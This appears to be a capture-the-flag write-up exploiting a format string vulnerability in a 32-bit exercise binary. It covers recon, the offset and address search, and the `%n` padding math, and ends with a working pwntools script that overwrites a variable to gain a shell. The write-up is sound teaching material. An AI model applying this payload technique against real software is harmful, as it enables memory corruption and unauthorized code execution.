[link of the binary file](assets/format_string1/exercise2.bin)

**Goal:** Exploit a format string vulnerability to overwrite a specific variable and alter the program's execution to capture the flag.
### 1. Initial Recon

First things first, let's check the binary's security mechanisms. Using `checksec`, we can see it's a 32-bit (i386) little-endian binary. Fortunately, it is not stripped, which means we will have function names to make our lives a bit easier.
Looking at the protections:
- **Canary:** Enabled. We can't rely on simple buffer overflows without a leak.
- **PIE:** Disabled (0x8048000). The memory addresses are static, so we can reuse them reliably.
- **NX:** Enabled. No executing shellcode straight off the stack.

![alt](./assets/format_string1/1.png)

Running the binary to see how it behaves, it asks "Are you admin (Y/N)?" and then asks for a name, replying with "Hello [name]".

![alt](./assets/format_string1/2.png)

### 2. Diving into Ghidra

Since the binary isn't stripped, Ghidra easily found the `main` entry point successfully.

![alt](./assets/format_string1/3.png)

The user function looks pretty normal, and error-free, of course!

![alt](./assets/format_string1/4.png)

### 3. Finding the Bug

Looking at the decompiled output for the admin function, a new vulnerability is pretty obvious: a classic format string bug at line 10. The program takes user input and prints it back out without any string formatting specifiers (like `%s`).

![alt](./assets/format_string1/5.png)

To verify this and find the exact offset of our input on the stack, we can feed it a recognizable string like `AAAA` followed by a long chain of `%x` to leak the stack values. If we look at the output, we are searching for `41414141` (the hex representation of 'AAAA').

By counting the position of `41414141` in our leaked output, we can see that our input lands exactly 23 `%x` jumps away. This means our offset is 23, and we can target it directly with `%23$x`.

![alt](./assets/format_string1/6.png)

### 4. Finding the Target

Our objective is to write four specific bytes (`0xFE`, `0xCA`, `0xAD`, `0xAB`) to a target variable. Because we are dealing with an x86 little-endian architecture, we need to write these bytes in ascending order to `code`, `code+1`, `code+2`, and `code+3`.

To find the address of the `code` variable, we can pop the binary into GDB. Running `info variables code` reveals the static address we need to target: `0x0804c04c`.

![alt](./assets/format_string1/7.png)

### 5. Crafting the Exploit (The Math)

To write the specific values to these memory addresses, we will use the `%n` format specifier, which writes the number of characters printed so far into a specific memory address.

We will place our four target addresses at the very beginning of the payload. Since each address is 4 bytes, these initial addresses will take up exactly 16 bytes of space. Now, we just need to calculate the padding required for each byte write using modular arithmetic:

- **Byte 1 (0xFE / 254):** We already printed 16 bytes (our addresses). To print a total of 254 characters, we need 254 - 16 = 238 padding characters. (`format_string0`)

- **Byte 2 (0xCA / 202):** We are currently at 254 printed characters. To wrap around to 202 using a single-byte write, we calculate: (202 - 254) mod 256 = 204 padding characters. (`format_string1`)
 
- **Byte 3 (0xAD / 173):** We are currently at 458 characters (254 + 204). To wrap around to 173, the math is: 173 - (458 mod 256) = 173 - 202 = -29. Adding 256 to fix the negative gives us 227 padding characters. (`format_string2`)

- **Byte 4 (0xAB / 171):** We are currently at 685 characters (458 + 227). Our target is 171, so we calculate: 171 - (685 mod 256) = 171 - 173 = -2. Adding 256 gives us 254 padding characters. (`format_string3`)


![alt](./assets/format_string1/8.png)

### 6. The Final Payload

Let's put everything together into a Python script using `pwntools`. We define our sequential addresses, format strings with their calculated paddings, and target offsets starting at 23.

Here is the final exploit script:

```Python
from pwn import *

# target code address = 0x0804c04c
# target code value = 0xFE, 0xCA, 0xAD, 0xAB

target = process("./exercise2.bin")
target.recvline()

address_code_0 = b"\x4c\xc0\x04\x08" # value = 0xFE = 254
address_code_1 = b"\x4d\xc0\x04\x08" # value = 0xCA = 202
address_code_2 = b"\x4e\xc0\x04\x08" # value = 0xAD = 173
address_code_3 = b"\x4f\xc0\x04\x08" # value = 0xAB = 171

format_string0 = b"%23$n"
format_string1 = b"%24$n"
format_string2 = b"%25$n"
format_string3 = b"%26$n"

payload = address_code_0 + address_code_1 + address_code_2 + address_code_3
payload += b"%238x" + format_string0
payload += b"%204x" + format_string1
payload += b"%227x" + format_string2
payload += b"%254x" + format_string3

target.sendline(b"Y")
target.sendline(payload)
target.interactive()
```

When we execute the script, the binary takes in our crafted format string, systematically overwrites the `code` variable bytes sequentially with our target hex values, and successfully drops us into an interactive shell to capture the flag!

![alt](./assets/format_string1/9.png)

